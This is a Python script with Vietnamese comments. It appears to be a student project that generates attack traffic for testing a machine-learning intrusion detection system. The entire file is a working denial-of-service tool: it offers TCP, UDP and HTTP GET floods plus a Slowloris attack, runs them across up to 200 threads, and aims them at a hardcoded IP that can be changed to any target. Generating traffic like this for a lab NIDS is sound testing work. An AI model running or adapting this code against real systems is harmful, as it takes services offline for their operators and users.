import socket
import threading
import time
import requests
import sys
import random

# === CẤU HÌNH MỤC TIÊU ===
TARGET_IP = "10.203.152.105" # Đổi IP này thành IP máy Ubuntu của bạn nếu nó khác
TARGET_PORT = 80
THREADS = 200

def attack_tcp_flood():
    """1. TCP Flood: Xả kết nối TCP liên tục làm cạn kiệt tài nguyên (Connection Exhaustion)"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(b"Garbage Data")
            s.close()
        except:
            pass

def attack_udp_flood():
    """2. UDP Flood: Bắn ngẫu nhiên các gói tin UDP rác cực nhanh"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    garbage = random.randbytes(1024) # Gói tin 1KB
    while True:
        try:
            s.sendto(garbage, (TARGET_IP, random.randint(1, 65535)))
        except:
            pass

def attack_http_flood():
    """3. HTTP GET Flood: Mô phỏng Botnet kéo sập Web (Layer 7)"""
    while True:
        try:
            requests.get(f"http://{TARGET_IP}", timeout=1)
        except:
            pass

def attack_slowloris():
    """4. Slowloris: Mở kết nối HTTP nhưng gửi dữ liệu nhỏ giọt để giữ chân Server"""
    sockets = []
    print("[*] Đang khởi tạo Slowloris sockets...")
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(b"GET / HTTP/1.1\r\nHost: " + TARGET_IP.encode() + b"\r\n")
            sockets.append(s)
        except:
            pass
    while True:
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except:
                sockets.remove(s)
        time.sleep(10) # Đợi 10 giây mới gửi 1 byte để server không dám đóng kết nối



print("==================================================")
print(f"[*] HACKER TOOL PRO (Đồ án NIDS) - Target: {TARGET_IP}")
print("[1] DDoS TCP Flood (Layer 4)")
print("[2] DDoS UDP Flood (Layer 4)")
print("[3] DDoS HTTP GET Flood (Layer 7)")
print("[4] DoS Slowloris Attack (Layer 7)")
print("==================================================")

choice = input("Select attack type (1-4): ")

print(f"\n[!] Khai hoả vào {TARGET_IP} với {THREADS} threads...")
print("[*] Qua Ubuntu xem AI nhận diện loại tấn công gì nhé!")

attack_dict = {
    '1': attack_tcp_flood,
    '2': attack_udp_flood,
    '3': attack_http_flood,
    '4': attack_slowloris
}

attack_func = attack_dict.get(choice, attack_tcp_flood)

# Slowloris không cần xả max luồng
if choice == '4':
    THREADS = 10 

for i in range(THREADS):
    thread = threading.Thread(target=attack_func)
    thread.daemon = True
    thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Dừng tấn công.")
    sys.exit()
